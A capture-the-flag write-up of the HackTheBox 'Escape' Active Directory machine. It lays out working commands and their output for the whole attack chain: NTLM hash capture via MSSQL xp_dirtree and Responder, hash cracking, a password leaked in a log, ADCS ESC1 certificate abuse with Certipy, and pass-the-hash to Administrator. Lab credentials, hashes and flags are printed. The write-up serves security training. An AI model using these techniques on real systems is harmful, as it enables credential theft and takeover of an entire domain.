# Escape — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Medium |
| Active Directory | Yes |
| IP | 10.129.228.253 |
| Domain | sequel.htb |
| DC | dc.sequel.htb |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/escape](https://jostif.pages.dev/writeups/escape) |

**Techniques:** SMB guest → PDF credential leak → MSSQL xp_dirtree NTLM coercion → Responder → hashcat → ERRORLOG password leak → ADCS ESC1 (certipy) → faketime clock skew → Administrator PTH

---

---

## Overview

Escape is a Medium-rated Windows Active Directory machine on Hack The Box. It walks through a realistic internal network scenario involving an exposed MSSQL instance, credential leakage in log files, and an ADCS misconfiguration (ESC1) to escalate to Domain Admin.

The attack chain is:

```
SMB anonymous read → PDF with SQL creds → xp_dirtree NTLM capture
→ hash crack → MSSQL error log leaks Ryan's password
→ ADCS ESC1 → Administrator NT hash → root
```

This box is excellent for learning how small misconfigurations chain together into full domain compromise. Every step mirrors a real-world finding.

---

## Enumeration

### Nmap

We start with a full port scan:

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.228.253
```

Key findings:

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Domain controller confirmed |
| 88 | Kerberos | AD environment |
| 389/636 | LDAP/LDAPS | Domain: `sequel.htb` |
| 445 | SMB | Windows Server 2019 |
| 1433 | MSSQL | SQL Server 2019 RTM |
| 5985 | WinRM | Remote management |

The domain is `sequel.htb`, the DC hostname is `dc.sequel.htb`. Add both to `/etc/hosts`:

```bash
echo "10.129.228.253  sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

Also note the **clock skew** reported by Nmap — ~8 hours difference from the DC. This will matter later when we use Kerberos.

```
_clock-skew: mean: 7h59m58s
```

### SMB Enumeration

We test for anonymous and guest access:

```bash
# Null session — access denied on shares
nxc smb 10.129.228.253 -u '' -p '' --shares

# Guest account — works!
nxc smb 10.129.228.253 -u 'guest' -p '' --shares
```

Output shows a non-default share:

```
Share           Permissions     Remark
-----           -----------     ------
IPC$            READ            Remote IPC
Public          READ
```

We connect and download the file inside:

```bash
smbclient //10.129.228.253/Public -U guest
```

```
smb: \> get "SQL Server Procedures.pdf"
```

---

## Initial Foothold

### Credential Discovery — SQL Server Procedures PDF

The PDF is an internal document written for employees explaining how to access the SQL Server. At the bottom there's a bonus section:

> *For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user **PublicUser** and password **GuestUserCantWrite1**.*

We now have SQL Server credentials: `PublicUser:GuestUserCantWrite1`

The document also mentions the MSSQL instance on the DC is a "mock instance" and references employees named **Tom**, **Ryan**, and **Brandon** — worth noting for later.

### Connecting to MSSQL

Verify the creds work (note: `--local-auth` needed since Windows auth tries to authenticate as a domain user which maps to Guest):

```bash
nxc mssql 10.129.228.253 -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth
```

```
[+] DC\PublicUser:GuestUserCantWrite1
```

Connect with impacket:

```bash
impacket-mssqlclient sequel/PublicUser:GuestUserCantWrite1@10.129.228.253
```

Check our privilege level:

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');  -- returns 0, not sysadmin
SELECT SYSTEM_USER, USER_NAME();      -- returns: guest / guest
EXEC xp_cmdshell 'whoami';           -- EXECUTE permission denied
```

We're a low-privileged SQL user. `xp_cmdshell` is locked down, but `xp_dirtree` is not.

### NTLM Hash Capture via xp_dirtree

`xp_dirtree` is an MSSQL stored procedure that lists directory contents — including UNC paths over the network. When pointed at our machine, the SQL Server will authenticate outbound using NTLM, leaking the service account's hash.

**Step 1 — Start Responder on your tun0 interface:**

```bash
sudo responder -I tun0 -v
```

**Step 2 — Trigger the outbound auth from MSSQL:**

```sql
EXEC master.dbo.xp_dirtree '\\10.10.14.78\share', 1, 1;
```

> Replace `10.10.14.78` with your actual VPN IP (`ip a show tun0`)

Responder catches the hash:

```
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1a34688b7f2bac9b:DD3BD9CD...
```

The SQL Server is running as `sequel\sql_svc`. We now have their NTLMv2 hash.

### Cracking the Hash

Save the full hash line to a file and run hashcat:

```bash
hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt
```

Result — cracked in **6 seconds**:

```
sql_svc::sequel:...:REGGIE1234ronnie
```

Credentials: `sql_svc:REGGIE1234ronnie`

### WinRM as sql_svc

Port 5985 (WinRM) is open. Check if this account can use it:

```bash
nxc winrm 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

```
[+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

Get a shell:

```bash
evil-winrm -i 10.129.228.253 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

---

## Lateral Movement — sql_svc → Ryan.Cooper

### Exploring the Filesystem

From the WinRM shell we can see there's another user profile on the box:

```powershell
ls C:\Users
# Administrator, Public, Ryan.Cooper, sql_svc
```

Ryan.Cooper's directory is locked to us. We poke around and find something interesting:

```powershell
ls C:\sqlserver\Logs\
# ERRORLOG.BAK
cat C:\sqlserver\Logs\ERRORLOG.BAK
```

Buried in the SQL error log are two failed login attempts from setup:

```
Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match...
Logon failed for user 'NuclearMosquito3'. Reason: Password did not match...
```

This is a classic **password-as-username** mistake. The person configuring the SQL Server typed their password (`NuclearMosquito3`) into the username field by accident. The error log captured it.

### Switching to Ryan.Cooper

On Windows via evil-winrm there's no `su` command. Exit and reconnect:

```bash
evil-winrm -i 10.129.228.253 -u 'ryan.cooper' -p 'NuclearMosquito3'
```

Grab the user flag:

```powershell
cat C:\Users\Ryan.Cooper\Desktop\user.txt
```

```
b25d949f629741738ddc050520eab6bd
```

---

## Privilege Escalation — ESC1 (ADCS Abuse)

### Why Look at ADCS?

Back when we ran `whoami /groups` as `sql_svc`, one group stood out:

```
BUILTIN\Certificate Service DCOM Access
```

This membership hints that Active Directory Certificate Services (ADCS) is installed and relevant. ADCS misconfigurations are a common and powerful privilege escalation path in AD environments.

### Enumerating Certificate Templates with Certipy

Run Certipy as Ryan.Cooper to find vulnerable templates:

```bash
certipy-ad find -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' \
  -dc-ip 10.129.228.253 -vulnerable -stdout
```

Certipy identifies **ESC1**:

```
Template Name         : UserAuthentication
Enrollee Supplies Subject : True
Client Authentication     : True
Enrollment Rights         : SEQUEL.HTB\Domain Users

[!] Vulnerabilities
    ESC1 : Enrollee supplies subject and template allows client authentication.
```

### What is ESC1?

ESC1 is an ADCS misconfiguration where:

1. The certificate template allows **any enrolling user to specify a Subject Alternative Name (SAN)**
2. The template allows **Client Authentication** (meaning the cert can be used to authenticate as any user)
3. **Domain Users** can enroll (so we can request one right now)

This means we can request a certificate for `administrator@sequel.htb` and authenticate as Administrator — even without knowing their password.

### Requesting a Certificate as Administrator

```bash
certipy-ad req \
  -u ryan.cooper@sequel.htb \
  -p 'NuclearMosquito3' \
  -ca sequel-DC-CA \
  -template UserAuthentication \
  -upn administrator@sequel.htb \
  -dc-ip 10.129.228.253
```

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

We now hold a valid certificate for the Administrator account.

### Authenticating with the Certificate

Use the cert to get a TGT and extract the NT hash:

```bash
certipy-ad auth -pfx administrator.pfx -domain sequel.htb \
  -username administrator -dc-ip 10.129.228.253
```

```
[-] KRB_AP_ERR_SKEW(Clock skew too great)
```

The ~8 hour clock difference from Nmap comes back to bite us. Kerberos rejects tickets when the client clock is too far off the DC. Fix it with `faketime`:

```bash
faketime -f "+8h" certipy-ad auth -pfx administrator.pfx \
  -domain sequel.htb -username administrator -dc-ip 10.129.228.253
```

```
[*] Got TGT
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

We have the Administrator's NT hash.

### Shell as Administrator

Pass-the-Hash with evil-winrm:

```bash
evil-winrm -i 10.129.228.253 -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
sequel\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4523a45b659ed93d1c9c04a3a51801c3
```

---

## Flags

| Flag | Hash |
|------|------|
| User | `b25d949f629741738ddc050520eab6bd` |
| Root | `4523a45b659ed93d1c9c04a3a51801c3` |

---

## Full Attack Chain Summary

```
[1] SMB guest access → Public share → SQL Server Procedures.pdf
        ↓
[2] PDF contains SQL creds: PublicUser:GuestUserCantWrite1
        ↓
[3] MSSQL → xp_dirtree → Responder captures sql_svc NTLMv2 hash
        ↓
[4] Hashcat (m5600) → sql_svc:REGGIE1234ronnie (6 seconds)
        ↓
[5] WinRM as sql_svc → ERRORLOG.BAK → Ryan.Cooper:NuclearMosquito3 (typed password as username)
        ↓
[6] WinRM as ryan.cooper → user.txt
        ↓
[7] Certipy → ADCS ESC1 on UserAuthentication template
        ↓
[8] Request cert with administrator@sequel.htb UPN
        ↓
[9] faketime +8h → certipy auth → Administrator NT hash
        ↓
[10] evil-winrm PTH → root.txt
```

---

## Key Concepts

### xp_dirtree NTLM Coercion
MSSQL's `xp_dirtree` procedure accepts UNC paths and will authenticate to them using the service account's credentials. This is not a bug — it's a feature being abused. The fix is to block outbound SMB from the SQL Server or disable `xp_dirtree` for low-privileged users.

### Password in Log Files
SQL Server logs failed authentication attempts including the supplied username. If someone types their password into the username field, it gets written to the error log in plaintext. Always check `ERRORLOG` and `ERRORLOG.BAK` when you have filesystem access.

### ADCS ESC1
Active Directory Certificate Services becomes a privilege escalation vector when certificate templates allow enrollees to specify the Subject Alternative Name (SAN). Because certificates are trusted for authentication, a low-privileged user can obtain a cert that impersonates any account — including Domain Admin. Certipy is the go-to tool for finding and exploiting these.

### Clock Skew and Kerberos
Kerberos authentication requires clocks to be within 5 minutes of the domain controller. When testing from an external machine with a large skew, use `faketime` to offset your system time for specific commands without affecting your whole OS.

### Pass-the-Hash
NT hashes extracted via Certipy or secretsdump can be used directly for authentication without cracking. evil-winrm's `-H` flag accepts NT hashes for WinRM sessions.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `netexec (nxc)` | SMB/MSSQL/WinRM authentication testing |
| `smbclient` | SMB share browsing and file download |
| `impacket-mssqlclient` | MSSQL interactive shell |
| `responder` | NTLM hash capture |
| `hashcat` | NTLMv2 hash cracking (-m 5600) |
| `evil-winrm` | WinRM shell and pass-the-hash |
| `certipy-ad` | ADCS enumeration and ESC1 exploitation |
| `faketime` | Clock skew bypass for Kerberos |
